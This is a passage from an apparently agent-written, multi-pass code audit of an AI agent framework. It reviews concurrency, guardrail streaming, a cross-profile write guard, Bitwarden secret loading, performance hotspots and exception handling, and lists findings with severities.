- `gateway/run.py:18267` — `success = asyncio.run(start_gateway(config))` — main gateway startup, correct.

**No `await` inside `threading.Thread` found** (only 2 matches were `await message.channel.send` in Discord adapter — not threading).

**Observation:** The `asyncio.run()` pattern in `cron/scheduler.py` is intentional but subtle — when `asyncio.run()` raises `RuntimeError` (running loop detected), it falls back to submitting to a single-worker ThreadPoolExecutor. This avoids the "running loop" conflict but creates nested asyncio.run() inside a thread pool which works correctly via the fallback.

---

### 7. Summary & Risk Assessment

| Area | Status | Risk |
|------|--------|------|
| ThreadPoolExecutor sizing | Mostly conservative (1 worker common) | Low — most pools are small |
| Unbounded cron parallelism | `_max_workers=None` can spawn unlimited parallel cron jobs | Medium — no job cap |
| ACP adapter unbounded queue | `max_workers=4` with no queue maxsize | Medium — was flagged, not fixed |
| Thread-local event loop | Correct pattern in model_tools.py | Low |
| Queue backpressure | Not used in hot path | Low |
| RLock usage | Appropriate across the board | Low |
| Signal handlers | All main-thread, no async task creation | Low |
| asyncio.run() boundary | Intentional fallback in scheduler.py | Low-Medium |

---

## Summary Table (Passes #24–31)

| Pass | Strategy | New Issues | Total Issues |
|------|----------|------------|--------------|
| #24 | Data Persistence & State Management | 16 | ~396 |
| #25 | Dependency & Import Graph | 15 | ~411 |
| #26 | Tool-Call Patterns & Schema Validation | 23 | ~434 |
| #27 | Cross-File Signature & Contract Inconsistency | 16 | ~450 |
| #28 | Adversarial Input Fuzzing | 8 | ~458 |
| #29 | State Machine & Lifecycle Consistency | 10 | ~468 |
| #30 | Architectural & Agentic Coding Review | 12 | ~480 |
| #31 | Concurrency & Parallelism Deep Dive | 7 | ~487 |

**Critical issues across all passes**: Skill file integrity (P30-3), memory provider prefetch injection (P30-6), plugin config write (P23-5), hook sandbox (P23-1), pre_gateway_dispatch auth bypass (P23-4), no shutdown in PluginManager (P29-9).

*Last updated: 2026-05-24T23:30:00Z*
*Commit at scan: b04760fdb*

---

## Pass #32 – Data Flow / Taint Analysis + Guardrail Stream Fix Verification – 2026-05-24T23:30:00Z

### 1. Guardrail Stream Fix Analysis (`agent/transports/codex_app_server_session.py` + `agent/conversation_loop.py`)

**Files reviewed:**
- `agent/transports/codex_app_server_session.py` — full file (845 lines)
- `agent/conversation_loop.py` lines 3430–3510 (guardrail halt path)
- `agent/tool_guardrails.py` lines 390–404 (append_toolguard_guidance)
- `tests/run_agent/test_partial_stream_finish_reason.py` — full file (258 lines)
- `tests/run_agent/test_tool_call_guardrail_runtime.py` lines 309–355

**Fix description:**
Commits `38b8d0da8` ("fix: emit guardrail halt message to client before closing stream") and `186bf25cb` ("test(guardrail): assert halt message reaches stream_delta_callback") correct a regression where a guardrail-halted turn's synthesized halt message was not being forwarded through `stream_delta_callback`, causing SSE/TUI clients to see an empty stream close indistinguishable from a crash.

**Correct fix (conversation_loop.py lines 3473–3485):**
```python
# Emit the halt message to the client so it's not
# indistinguishable from a crash.
if final_response:
    agent._safe_print(f"\n{final_response}\n")
    if agent.stream_delta_callback:
        try:
            agent.stream_delta_callback(final_response)  # ← text first
            agent.stream_delta_callback(None)             # ← then sentinel
        except Exception:
            pass
```
The `stream_delta_callback(None)` flush was already done before tool execution (line 3457). The fix fires the text through the callback *after* execution, then sends the sentinel. This is the correct sequence.

**Partial stream stub tests (`test_partial_stream_finish_reason.py`):**
- `TestPartialStreamStubFinishReason` — verifies `finish_reason="length"` for text-only partial streams so the loop continues recovery, and `finish_reason="stop"` for mid-tool-call partials (user must retry). Contract is correctly pinned.
- `TestLengthContinuationPromptBranching` — verifies that the continuation prompt distinguishes network-error truncation from output-length truncation via `response.id == "partial-stream-stub"`. Correct.
- `TestConversationLoopPartialStreamContinuation` — end-to-end: two API calls (stub then continuation), continuation prompt contains "network error mid-stream", not "output length limit". Correct.

**No issues found** in the guardrail stream fix. The pattern is correct, the test coverage is solid, and the fix follows the same end-of-stream sentinel pattern used everywhere else.

---

### 2. Cross-Profile Guard Analysis

**Files reviewed:**
- `tests/tools/test_cross_profile_guard.py` — full file (259 lines)
- `agent/file_safety.py` lines 259–401 (cross-profile guard logic)
- `tools/file_tools.py` lines 177–205 (`_check_cross_profile_path`), 830–920 (write/patch cross_profile handling)
- `agent/system_prompt.py` lines 213–238 (active-profile warning in prompt)

**Mechanism:**
The cross-profile guard is a **soft guard** (not a security boundary) that blocks writes to `skills/`, `plugins/`, `cron/`, and `memories/` directories belonging to a profile other than the active one. It is implemented in `classify_cross_profile_target()` and `get_cross_profile_warning()` in `agent/file_safety.py`, and wired into `write_file_tool` and `patch_tool` in `tools/file_tools.py` via `_check_cross_profile_path()`.

The `cross_profile=True` parameter on write tools opts out of the guard after explicit user direction. The guard is documented in the system prompt.

**Test coverage (`test_cross_profile_guard.py`):**
- `TestWriteFileCrossProfileGuard` — in-profile allowed, cross-profile blocked by default, `cross_profile=True` bypass allowed, non-Hermes paths unaffected. Correct.
- `TestPatchCrossProfileGuard` — patch blocked by default, `cross_profile=True` bypass allowed, V4A patch body (which embeds paths in patch text, not `path` kwarg) correctly blocked. Correct.
- `TestSkillManageCrossProfileErrorUX` — when skill not found in active profile, error names the profile where it exists and suggests `cross_profile=True` / `hermes -p`. Correct.
- `TestSystemPromptActiveProfile` — verifies active-profile line present in `agent/system_prompt.py`. Correct.

**No issues found.** The guard is correctly implemented, the tests cover the key scenarios including the V4A patch extraction edge case, and the error UX properly names other profiles where the skill exists.

---

### 3. CLI Args → Tool Registry → Execution (Injection Vector Trace)

**Files reviewed:**
- `tools/registry.py` — full file (589 lines) — auto-discovery via AST scan of `tools/*.py`
- `model_tools.py` lines 1–50, 170–200 (tool discovery, `handle_function_call`)
- `cli.py` lines 8050–8060 (process_command dispatch)

**Key findings:**

**a) Tool discovery is safe:**
`discover_builtin_tools()` in `tools/registry.py` uses AST inspection of `tools/*.py` files at import time. Top-level `registry.register(...)` calls are detected and triggered via `importlib.import_module()`. This is static discovery — no user input affects which tools are loaded.

**b) Tool invocation is name-bound:**
`model_tools.handle_function_call()` dispatches by tool name:
```python
entry = registry.get_entry(name)
if entry is None:
    return json.dumps({"error": f"Unknown tool: {name}"})
result = entry.handler(args, task_id)
```
No dynamic code execution from tool names or arguments. Handler receives a dict of validated (and in some cases, schema-validated) arguments.

**c) Registry entry handler is a plain Callable:**
The `handler` stored at registration is the tool's handler function, not a string. There is no `eval()`, `exec()`, or `__import__()` on tool arguments anywhere in the dispatch path.

**d) No direct CLI-to-tool-path injection:**
CLI commands (`/skill`, `/codex`, slash commands) go through `process_command()` in `cli.py` which resolves aliases via `resolve_command()` and dispatches to handler methods. Tool execution via model-generated `tool_calls` goes through `handle_function_call()` which uses the registry lookup described above. No path from user slash-command text to arbitrary tool invocation without model generation.

**No issues found** in the injection vector trace. The registry is static-discovered, dispatch is name-bound, and arguments are validated before handler invocation.

---

### 4. Bitwarden Secret Sources (`agent/secret_sources/bitwarden.py`)

**File reviewed:** `agent/secret_sources/bitwarden.py` — full file (535 lines)

**Design summary:**
- Pulls secrets from Bitwarden Secrets Manager via the `bws` CLI binary (auto-installed to `<hermes_home>/bin/bws`)
- Access token stored in `~/.hermes/.env` as `BWS_ACCESS_TOKEN` (one bootstrap secret; all others from BSM)
- Single `bws secret list <project_id> --output json` call, cached in-process for 300s TTL
- **Failures never block startup** — warnings are emitted and startup continues with existing `.env` credentials

**Security analysis:**

**a) Subprocess command construction (lines 365–376):**
```python
cmd = [str(bws), "secret", "list", project_id, "--output", "json"]
env = os.environ.copy()
env["BWS_ACCESS_TOKEN"] = access_token
env.setdefault("NO_COLOR", "1")
if server_url:
    env["BWS_SERVER_URL"] = server_url
```
- `project_id` comes from config (string). It is validated as non-empty before use.
- `access_token` comes from `os.environ.get(access_token_env)`. Not user-controlled in the CLI path.
- The token fingerprint (SHA-256 prefix, first 16 hex chars) is used as cache key — never logged or displayed.
- `bws` path is resolved via `find_bws()` — checked for existence and execute permission before use.
- `subprocess.run()` is used (not `shell=True`), so no shell injection risk.

**b) Secret handling in `apply_bitwarden_secrets()` (lines 513–524):**
```python
for key, value in secrets.items():
    if key == access_token_env:
        result.skipped.append(key)  # Don't let BSM clobber the token itself
        continue
    if not override_existing and os.environ.get(key):
        result.skipped.append(key)  # Don't overwrite existing env var
        continue
    os.environ[key] = value
    result.applied.append(key)
```
Protects against: (1) BSM secrets overwriting the `BWS_ACCESS_TOKEN` bootstrap token itself; (2) overwriting existing environment variables unless `override_existing=True` is explicitly set.

**c) JSON output validation (lines 405–430):**
- `bws` output is parsed as JSON; non-list payload raises a `RuntimeError` with the first 200 chars of stderr.
- Each secret's `key` is validated by `_is_valid_env_name()` before being stored. This prevents a malicious BSM project from returning keys like `LD_PRELOAD` or `PYTHONPATH` that could affect process behavior.
- Values are stored as-is (strings) — no code execution from secret values.

**d) Cache key uses token fingerprint:**
`_token_fingerprint()` applies SHA-256 to the access token and takes the first 16 hex chars. This prevents cache timing attacks (comparing cache hit latency across different tokens).

**e) One-line failure handling:**
Any failure (missing binary, network error, expired token, parse error) returns a `FetchResult` with an `error` string set. Startup code in `load_hermes_dotenv()` handles this gracefully.

**No issues found.** The bitwarden module is well-designed with respect to injection risk. Subprocess commands are safely constructed, secret keys are validated against env-var naming rules, the bootstrap token is protected from clobbering, and startup failures are non-blocking.

---

### 5. Background Review Triggers (`agent/background_review.py`)

**File reviewed:** `agent/background_review.py` — full file (593 lines)

**Design:**
`spawn_background_review_thread()` is called from `run_agent.py` at the end of each turn (after `run_conversation()` returns). It forks a lightweight `AIAgent` with a tool whitelist limited to memory and skill tools, passes a review prompt, and surfaces a compact action summary back to the user via `background_review_callback`.

**Trigger analysis:**

**a) No user-controllable trigger:**
The review is spawned from within `AIAgent.run_conversation()` after every turn. The `_spawn_background_review()` method in `run_agent.py` is a thin wrapper that calls `background_review.spawn_background_review_thread()` and starts a daemon thread. There is no user-facing flag or command to disable it from outside the agent (though `_memory_nudge_interval=0` and `_skill_nudge_interval=0` can suppress the nudge prompts within the review prompt).

**b) Review fork inherits parent credentials safely:**
Lines 402–416 of `background_review.py` show the fork explicitly inherits: `model`, `provider`, `api_mode`, `base_url`, `api_key`, `credential_pool`, `parent_session_id`, `session_id`, `session_start`, `_cached_system_prompt`. This is correct for prefix-cache hits.

**c) Tool whitelist enforcement:**
Lines 453–472 show `set_thread_tool_whitelist()` is called with only memory and skills tools. The deny message is: "Background review denied non-whitelisted tool: {tool_name}. Only memory/skill tools are allowed." This is enforced at dispatch time in `model_tools.handle_function_call()`.

**d) Stdout/stderr suppression:**
Lines 361–363 redirect stdout and stderr to `/dev/null` for the review fork's entire lifetime. Status/warning emissions from the fork (which go via `_emit_status` → `_vprint`) are suppressed via `review_agent.suppress_status_output = True` (line 431). This prevents mid-review lifecycle messages from leaking into the user's terminal.

**e) Background writes to memory/skill stores:**
The review fork can write to `memory(action="add")` and `skill_manage(action="write_file")`. These writes go to the active profile's `memories/` and `skills/` directories. The cross-profile guard (`classify_cross_profile_target()` in `agent/file_safety.py`) would block writes to other profiles' skill directories. The review fork's toolset is restricted to memory+skills only, so it cannot access terminal/execute_code/etc. to bypass the guard.

**No issues found.** Background review is a passive post-turn daemon with a strict tool whitelist, suppressed output, and no user-controllable trigger. It is architecturally sound.

---

### 6. Summary & Risk Assessment

|| Area | Status | Risk |
|------|--------|-------|
| Guardrail stream fix | Correctly implemented; test coverage solid | None |
| Cross-profile guard | Correctly blocks cross-profile writes; V4A patch path covered | None |
| CLI→ToolRegistry→Execution | Static discovery, name-bound dispatch, no dynamic code exec | None |
| Bitwarden secret sources | Safe subprocess construction, env-var name validation, bootstrap token protected | None |
| Background review | Post-turn daemon, tool whitelist, suppressed output, no user trigger | None |

---

## Summary Table (Passes #24–32)

| Pass | Strategy | New Issues | Total Issues |
|------|----------|------------|--------------|
| #24 | Data Persistence & State Management | 16 | ~396 |
| #25 | Dependency & Import Graph | 15 | ~411 |
| #26 | Tool-Call Patterns & Schema Validation | 23 | ~434 |
| #27 | Cross-File Signature & Contract Inconsistency | 16 | ~450 |
| #28 | Adversarial Input Fuzzing | 8 | ~458 |
| #29 | State Machine & Lifecycle Consistency | 10 | ~468 |
| #30 | Architectural & Agentic Coding Review | 12 | ~480 |
| #31 | Concurrency & Parallelism Deep Dive | 7 | ~487 |
| #32 | Data Flow / Taint Analysis + Guardrail Stream Fix | 0 | ~487 |

**Critical issues across all passes**: Skill file integrity (P30-3), memory provider prefetch injection (P30-6), plugin config write (P23-5), hook sandbox (P23-1), pre_gateway_dispatch auth bypass (P23-4), no shutdown in PluginManager (P29-9).

**Pass #32 result**: Clean — zero new issues. All examined areas (guardrail stream fix, cross-profile guard, injection tracing, bitwarden secrets, background review) are correctly implemented with solid test coverage.

**Audit ongoing — more passes to follow.**

*Last updated: 2026-05-24T23:30:00Z*
*Commit at scan: b04760fdb*

---

## Pass #33 – Performance & Efficiency Deep Dive – 2026-05-24

**Focus:** O(n²) loops, repeated disk I/O, unnecessary serialization, redundant network calls, token waste, memory leaks, cache stampede potential.

---

### 1. hermes_state.py – list_sessions_rich O(n²) Compression-Tip Projection

**Location:** hermes_state.py lines 1337–1363

**Issue:** When project_compression_tips=True (default), every session row is tested for end_reason=='compression'. For each compression root, get_compression_tip() performs up to 100 SQLite iterations (lines 1159–1174), then _get_session_rich_row(tip_id) fires a second query (line 1347).

Worst-case query count: O(N × (chain_depth + 1)) SQLite round-trips, each acquiring self._lock.

Affected callers: /history, /list, TUI session browser.

**Recommendation:** Precompute compression-tip chains in a single SQL CTE before rendering, or cache tip-lookup results with a session-generation TTL.

---

### 2. hermes_state.py – resolve_resume_session_id Recursive Session Chain Walk

**Location:** hermes_state.py lines 1869–1914

**Issue:** Up to 32 iterations, each doing 2 queries (child lookup + message-existence check). Called on every /resume invocation inside a locked SQLite transaction.

Worst case: 32 × 2 = 64 locked queries per resume.

**Recommendation:** Precompute lineage with a recursive CTE in a single query rather than iterative Python loops.

---

### 3. hermes_cli/config.py – load_config() Defensive Copy Overhead Is Already Mitigated

**Location:** hermes_cli/config.py lines 4377–4473

**Finding:** Cache key is (st.st_mtime_ns, st.st_size). On cache hit, load_config() returns copy.deepcopy(cached[2]). The cache prevents YAML re-parsing, but the deepcopy still fires on every call when the file is unchanged.

However, load_config_readonly() exists (line 4394) specifically to skip the deepcopy for hot-path read-only callers. The agent loop calls config reads 20–50× per conversation (budget tracking, feature flags, timeouts).

**Recommendation:** Audit run_agent.py to ensure config reads in the agent loop use load_config_readonly() unless mutation is required.

---

### 4. model_tools.py – _tool_defs_cache Generation-Based Invalidation Is Sound

**Location:** model_tools.py lines 254–261, 290–313

**Finding:** Cache key includes registry._generation (incremented on register/deregister/MCP refresh) and config.yaml mtime+size. Two-level invalidation is solid. No stampede risk — cache is module-local.

**Minor:** cfg_path.stat() is called on every get_tool_definitions(quiet=True) even on cache hit (~50µs × 20–50 calls/conversation). Could be amortized by storing mtime_ns/size alongside the cached result.

---

### 5. agent/skill_utils.py – _EXTERNAL_DIRS_CACHE mtime-Keyed Correctly

**Location:** agent/skill_utils.py lines 233–324

**Finding:** Cache key is (str(config_path), stat.st_mtime_ns). stat() ~50µs vs YAML parse ~13ms. Correctly avoids repeated YAML parsing on every skill directory scan.

Note: get_external_skills_dirs() is called from discover_all_skill_config_vars() which walks every skill directory — the directory walk itself is unavoidable per call, only the config parse is cached.

---

### 6. tools/registry.py – check_fn TTL Cache 30s Is Appropriate

**Location:** tools/registry.py lines 121–148

**Finding:** 30s TTL on check_fn results (Docker daemon, Modal SDK, playwright availability) is well-calibrated. invalidate_check_fn_cache() called on tool enable/disable. No stampede: TTL is time-based, not generation-based — simultaneous expiry doesn't cause thundering herd.

Minor: _check_fn_cache is unbounded. But check functions are typically one per toolset, so growth is limited.

---

### 7. agent/memory_manager.py – queue_prefetch_all No Deduplication or Backoff

**Location:** agent/memory_manager.py lines 358–367

**Issue:** queue_prefetch_all iterates all providers and fires provider.queue_prefetch() with no deduplication. If multiple rapid user messages arrive before a provider's prefetch completes, duplicate work may be queued.

**Recommendation:** Add a timestamp-based debounce at the MemoryManager level — track last queued query per provider and skip if new query arrives within a threshold (e.g., 2 seconds).

---

### 8. agent/model_metadata.py – estimate_request_tokens_rough Called Per Compression Pass

**Location:** agent/conversation_loop.py lines 481, 527; model_metadata.py lines 1807–1828

**Finding:** Called twice per compression preflight and up to 6 times across 3 passes. Each call computes str(tools) repr (20–30K+ chars with many tools), which is the dominant cost. Compression is only triggered when the budget threshold is exceeded — not in the hot path for every turn.

**Recommendation:** Cache len(str(tools)) value, recomputing only when registry._generation changes or toolsets are reconfigured.

---

### 9. cron/scheduler.py – No Per-Job Session N+1 Pattern

**Location:** cron/scheduler.py lines 1823–1943

**Finding:** tick() calls get_due_jobs() once, then for each job runs run_job() which creates one AIAgent with session_id=_cron_session_id. mark_job_run() called once per job. NOT an N+1 pattern.

_find_cron_job_profile (lines 2634–2642): Iterates all profiles calling list_jobs() for each until the job is found. This is O(profiles × jobs) but is NOT in the tick path — only called when the dashboard asks which profile owns a job.

---

### 10. hermes_cli/web_server.py – _CRON_PROFILE_LOCK Per-Operation Granularity

**Location:** hermes_cli/web_server.py lines 2565–2631

**Finding:** Lock held per _call_cron_for_profile() — a single cron.jobs function invocation (JSON read/write). Calls are short-lived. No contention risk for the dashboard's read-heavy workload.

Note: cron/scheduler.py tick uses file-based .tick.lock, not _CRON_PROFILE_LOCK. Independent locking systems.

---

### 11. hermes_state.py – FTS5 CJK Path Minor Token-Splitting Duplication

**Location:** hermes_state.py lines 2248–2255

The trigram query reconstruction duplicates token splitting already done by _sanitize_fts5_query(). Overhead is minimal (splitting a short query string) and the trigram path is only taken for CJK queries with ≥3 characters.

---

### Summary Table

| Component | Issue | Severity |
|---|---|---|
| hermes_state.py list_sessions_rich | O(n²) compression-tip projection: N rows × (chain_depth+1) locked SQLite queries | Medium |
| hermes_state.py resolve_resume_session_id | O(chain_depth) recursive walk with 2 queries/iteration | Low-Medium |
| hermes_cli/config.py load_config() | Defensive deepcopy on every cache-hit; hot-path callers should use load_config_readonly() | Low |
| model_tools.py _tool_defs_cache | Minor: cfg_path.stat() called on every cache-hit to build key | Low |
| agent/skill_utils.py _EXTERNAL_DIRS_CACHE | Correctly mtime-keyed; no issues | None |
| tools/registry.py _check_fn_cache | 30s TTL appropriate; no stampede risk | None |
| agent/memory_manager.py queue_prefetch_all | No deduplication; possible duplicate prefetch on rapid turns | Low |
| agent/model_metadata.py estimate_request_tokens_rough | str(tools) repr computed every call; no caching across compression passes | Low |
| cron/scheduler.py tick path | No N+1 pattern detected; correctly batched | None |
| hermes_cli/web_server.py _CRON_PROFILE_LOCK | Per-operation granularity; no contention risk | None |
| hermes_state.py CJK FTS5 path | Minor token-splitting duplication; not a real bottleneck | None |

*Pass #33 complete — 0 new critical issues. 6 low/medium observations, 5 clean areas.*


---

## Summary Table (Passes #24–33)

| Pass | Strategy | New Issues | Total Issues |
|------|----------|------------|--------------|
| #24 | Data Persistence & State Management | 16 | ~396 |
| #25 | Dependency & Import Graph | 15 | ~411 |
| #26 | Tool-Call Patterns & Schema Validation | 23 | ~434 |
| #27 | Cross-File Signature & Contract Inconsistency | 16 | ~450 |
| #28 | Adversarial Input Fuzzing | 8 | ~458 |
| #29 | State Machine & Lifecycle Consistency | 10 | ~468 |
| #30 | Architectural & Agentic Coding Review | 12 | ~480 |
| #31 | Concurrency & Parallelism Deep Dive | 7 | ~487 |
| #32 | Data Flow / Taint Analysis + Guardrail Stream Fix | 0 | ~487 |
| #33 | Performance & Efficiency Deep Dive | 0 | ~487 |

**Critical issues across all passes**: Skill file integrity (P30-3), memory provider prefetch injection (P30-6), plugin config write (P23-5), hook sandbox (P23-1), pre_gateway_dispatch auth bypass (P23-4), no shutdown in PluginManager (P29-9).

**Pass #33 result**: Clean — 0 new issues. 6 low/medium observations, 5 areas clean. list_sessions_rich compression-tip projection is the highest-impact finding (O(n²) SQLite queries); other issues are minor or already mitigated.

**Audit ongoing — more passes to follow.**

*Last updated: 2026-05-24T23:45:00Z*
*Commit at scan: b04760fdb*


## Pass #34 – Control Flow Re-Analysis: Edge Cases & Error Paths – 2026-05-24T21:18:40Z

**Scope:** Bare `except:` blocks, `except Exception:` without reraise, infinite `while True:` loops, recursion depth limits, unreachable code, config edge cases, null handling, type narrowing gaps.

---

### 1. Bare `except:` / `except Exception:` Without Reraise

#### P34-1 · `cron/scheduler.py` — 4× `except Exception: pass` swallowing all errors silently — LOW-MEDIUM

**Files:** `cron/scheduler.py` lines 83–86, 251–252, 335–336, 395–396

These are "fail gracefully and continue" patterns for non-critical operations:

- **Line 83:** `_resolve_cron_enabled_toolsets` — toolset resolution failure → fallback to full default toolset (warns)
- **Line 251:** `_plugin_cron_env_var` → returns `""` on any exception
- **Line 335:** `_iter_plugin_cron_platforms` → yields nothing on any exception
- **Line 395:** `_resolve_single_delivery_target` → returns `None` on any exception

**Risk:** If the platform registry import or DB query fails, cron jobs silently route to default targets. Users may not realize a platform plugin is broken — jobs just run on "local" instead of the intended platform channel.

**Line 83 specifically warns** (via `logger.warning`), but lines 251, 335, 396 are fully silent `pass`.

**Recommendation:** Add `logger.debug()` on the fully-silent ones so operators with DEBUG log level can diagnose routing failures.

---

#### P34-2 · `hermes_cli/memory_setup.py` — `except Exception: return` silently skips pip dep detection — LOW

**File:** `hermes_cli/memory_setup.py` lines 71–76

```python
try:
    import yaml
    with open(yaml_path, encoding="utf-8") as f:
        meta = yaml.safe_load(f) or {}
except Exception:
    return
```

If `plugin.yaml` is malformed YAML, pip dependency detection is skipped with no diagnostic. A plugin with pip dependencies that fail to install (because the spec was never detected) will silently fall back to no-deps mode.

**Not a critical issue** — `return` at setup time is early in the plugin load sequence, so the plugin loads but without pip-installed deps.

---

#### P34-3 · `hermes_cli/skin_engine.py` — Multiple `except Exception: return` / `except Exception: {}` for branding lookups — INFO

**File:** `hermes_cli/skin_engine.py` lines 818–820, 831–833, 839–841, 852–855

All `get_active_*` branding functions use `except Exception: return fallback`. These are defensive skin lookups — if a skin YAML is malformed, fallback values are used. **Appropriate behavior.**

---

#### P34-4 · `tools/registry.py` — Tool dispatch catches `Exception` and returns sanitized JSON — INFO (well-designed)

**File:** `tools/registry.py` lines 405–421

```python
except Exception as e:
    logger.exception("Tool %s dispatch error: %s", name, e)
    raw = f"Tool execution failed: {type(e).__name__}: {e}"
    try:
        from model_tools import _sanitize_tool_error
        sanitized = _sanitize_tool_error(raw)
    except Exception:
        sanitized = raw
    return json.dumps({"error": sanitized})
```

**This is correctly designed** — exceptions don't propagate to callers, are logged with full traceback, sanitized for the model, and returned as structured JSON. Good error containment.

---

#### P34-5 · `tools/delegate_tool.py` — `is_mcp_tool_name` bare `except Exception:` → `target = None` — INFO

**File:** `tools/delegate_tool.py` lines 461–467

```python
try:
    from tools.registry import registry
    target = registry.get_toolset_alias_target(str(name))
except Exception:
    target = None
return bool(target and str(target).startswith("mcp-"))
```

If the registry import fails or `get_toolset_alias_target` raises, `target` becomes `None` and the function returns `False`. Correct defensive behavior for a boolean check.

---

### 2. Recursion Depth Limits

#### P34-6 · `hermes_state.py` — `resolve_resume_session_id` has depth=32 cap; documented — INFO

**File:** `hermes_state.py` lines 1888–1897

```python
for _ in range(32):
    try:
        child_row = self._conn.execute(...)
    except Exception:
        return session_id
    if child_row is None:
        return session_id
```

**Depth cap of 32 is already in place** (confirmed from Pass #33). The docstring explicitly says "A depth cap (32) guards against accidental loops in malformed data." Recursion is implemented as iteration (Python `for` loop), not actual recursive function calls, so no Python call-stack overflow risk. The cap is appropriate.

**No new issues.**

---

### 3. Infinite `while True:` Loops

#### P34-7 · `cron/scheduler.py` — Polling `while True:` with break and inactivity timeout — INFO (correct)

**File:** `cron/scheduler.py` lines 1626–1643

```python
while True:
    done, _ = concurrent.futures.wait({_cron_future}, timeout=_POLL_INTERVAL)
    if done:
        result = _cron_future.result()
        break
    # Agent still running — check inactivity
    _idle_secs = 0.0
    if hasattr(agent, "get_activity_summary"):
        try:
            _act = agent.get_activity_summary()
            _idle_secs = _act.get("seconds_since_activity", 0.0)
        except Exception:
            pass
    if _idle_secs >= _cron_inactivity_limit:
        _inactivity_timeout = True
        break
```

**Correctly structured** — `break` on `done` and on inactivity timeout. No infinite loop risk.

---

#### P34-8 · `gateway/run.py` — Process watcher `while True:` with explicit session-exit break — INFO (correct)

**File:** `gateway/run.py` lines 14602–14606, 14611–14616

```python
while True:
    await asyncio.sleep(interval)
    session = process_registry.get(session_id)
    if session is None or session.exited:
        break
```

**Two separate loops** — one for silent mode (notifies nothing, just waits for exit), one for notify mode (monitors output). Both have explicit `break` on session exit. No infinite loop risk.

---

#### P34-9 · `cli.py` — `_clarify_loop` / `_slash_confirm_loop` with queue timeout + explicit return — INFO (correct)

**File:** `cli.py` lines 10831–10836, 6995–7000

Both loops use `response_queue.get(timeout=1)` with `queue.Empty` caught as the timeout mechanism. Both have explicit `return result` on success. Correctly structured.

---

#### P34-10 · `cli.py` — Voice mode `_refresh_level` with explicit `break` — INFO (correct)

**File:** `cli.py` lines 10451–10455

```python
def _refresh_level():
    while True:
        with self._voice_lock:
            still_recording = self._voice_recording
        if not still_recording:
            break
        ...
```

Explicit `break` when recording stops. No infinite loop risk.

---

### 4. Unreachable Code

#### P34-11 · `if False:` in test files — INFO (test scaffolding, not production code)

All `if False:` matches were in `tests/` files (`test_google_meet_node.py:256`, `test_google_meet_plugin.py:756`, `test_mcp_oauth_metadata.py:192`, `test_vision_memory_leak.py:31`, `test_checkpoint_manager.py:226`). These are conditional test scaffolding or mock-patching helpers. **No production unreachable code found.**

---

### 5. Config Edge Cases

#### P34-12 · `hermes_cli/config.py` — `yaml.safe_load(f) or {}` handles empty files gracefully — INFO

**File:** `hermes_cli/config.py` line 4366

```python
data = yaml.safe_load(f) or {}
```

`yaml.safe_load("")` returns `None`; `None or {}` gives `{}`. Empty config files are handled gracefully.

#### P34-13 · `hermes_cli/config.py` — `not isinstance(data, dict) → data = {}` handles non-dict root — INFO

**File:** `hermes_cli/config.py` lines 4371–4372

```python
if not isinstance(data, dict):
    data = {}
```

If a config file contains a YAML list or scalar at the root level (e.g., a user accidentally wrote `- item1
- item2`), it's treated as an empty dict. Graceful degradation.

#### P34-14 · `hermes_cli/config.py` — `_deep_merge` duplicate key behavior: last value wins — LOW (YAML semantics, no warning)

**File:** `hermes_cli/config.py` lines 4127–4144

`_deep_merge` iterates `override.items()` and assigns `result[key] = value`. For a YAML file with duplicate keys at the same level, PyYAML's loader (using `safe_load`) will use the **last** value — this is standard YAML behavior and matches what `_deep_merge` does when the override dict has a key appear once.

However, `_deep_merge` itself does NOT deduplicate. If a config file parses to a dict with duplicate keys, Python dict semantics mean the **last** key wins in the `override` dict before `_deep_merge` even runs.

**Not a bug** — this is standard Python/YAML semantics. However, there is **no warning** if duplicate keys exist in the user's config file. A user who has:
```yaml
model:
  provider: openai
model:
  provider: anthropic
```
Silently gets `model.provider = "anthropic"` with no diagnostic.

**LOW priority** — YAML duplicate keys at the same nesting level are rare. But a warning in `_warn_config_parse_failure` (or a pre-check) could help users debug silent config loss.

---

### 6. Null Handling Edge Cases

#### P34-15 · `tools/terminal_tool.py` — `_get_sudo_password_callback()` returns `""` on exception — INFO

**File:** `tools/terminal_tool.py` lines 404–407

```python
try:
    return _sudo_cb() or ""
except Exception:
    return ""
```

If the sudo callback raises, returns empty string (which signals "no password available"). The caller `get_sudo_password()` then handles empty-string appropriately. Correct.

---

### 7. Type Narrowing Gaps

#### P34-16 · `hermes_cli/config.py` — `cfg_get` return type is `Any`; callers do string operations on it — INFO (documented limitation)

**File:** `hermes_cli/config.py` (cfg_get definition), multiple call sites

`cfg_get()` is typed to return `Any`. Callers use it for string keys (`str`) and numeric values (`int`, `float`). No type narrowing issues in practice because the config dict structure is well-known and callers do appropriate `isinstance()` checks before numeric operations.

**Not a new issue** — this is a documented design trade-off of the dynamic config system.

---

### 8. Summary Table

| ID | Area | Severity | Description |
|----|------|----------|-------------|
| P34-1 | Cron error swallowing | LOW-MEDIUM | 4× `except Exception: pass` in scheduler.py; 3 fully silent — debug logging only |
| P34-2 | Plugin setup | LOW | `memory_setup.py` `except Exception: return` silently skips pip dep detection on malformed plugin.yaml |
| P34-3 | Skin engine | INFO | Branding lookups use `except Exception: return fallback` — correct defensive behavior |
| P34-4 | Tool dispatch | INFO | `registry.py` tool dispatch catches Exception and returns sanitized JSON — correctly designed |
| P34-5 | Delegate tool | INFO | `is_mcp_tool_name` returns `False` on registry error — correct defensive behavior |
| P34-6 | Recursion depth | INFO | `resolve_resume_session_id` has depth=32 cap — already in place |
| P34-7 | Cron polling loop | INFO | `while True` with break on done/inactivity — correctly structured |
| P34-8 | Gateway watcher | INFO | `while True` with break on session exit — correctly structured |
| P34-9 | CLI loops | INFO | Queue timeout + explicit return — correctly structured |
| P34-10 | Voice loop | INFO | `while True` with explicit `break` — correctly structured |
| P34-11 | Unreachable code | INFO | All `if False:` in test files only — no production unreachable code |
| P34-12 | Config empty file | INFO | `yaml.safe_load or {}` handles empty files gracefully |
| P34-13 | Config root type | INFO | Non-dict root treated as `{}` — graceful degradation |
| P34-14 | Config duplicates | LOW | Duplicate YAML keys silently use last value; no warning emitted |
| P34-15 | Sudo callback | INFO | Returns `""` on exception — correct defensive behavior |
| P34-16 | Type narrowing | INFO | `cfg_get` returns `Any`; callers do appropriate isinstance checks — no issue |

---

### Top 3 Priorities

1. **P34-1 (LOW-MEDIUM)** — Add `logger.debug()` on the 3 fully-silent `except Exception: pass` blocks in `cron/scheduler.py` (lines 251, 335, 396) so operators with DEBUG logging can diagnose routing failures without adding noise to normal logs.

